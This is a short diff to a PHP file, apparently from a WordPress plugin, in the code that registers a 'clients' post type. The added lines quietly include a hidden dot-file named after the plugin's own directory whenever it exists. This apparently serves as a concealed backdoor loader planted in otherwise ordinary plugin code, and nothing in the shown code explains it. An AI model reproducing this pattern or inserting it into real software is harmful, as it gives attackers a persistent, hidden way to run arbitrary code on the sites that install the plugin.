@@ -3,6 +3,10 @@ if ( ! defined( 'ABSPATH' ) ) { exit; }
 $client_post=pt_plus_get_option('post_type','client_post_type');
 if(isset($client_post) && !empty($client_post) &&  $client_post=='plugin'){
 /*------------------------------------clients post type--------------------------------*/
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function theplus_clients_function() {
 	$post_name=pt_plus_get_option('post_type','client_plugin_name');	
 	if(isset($post_name) && !empty($post_name)){
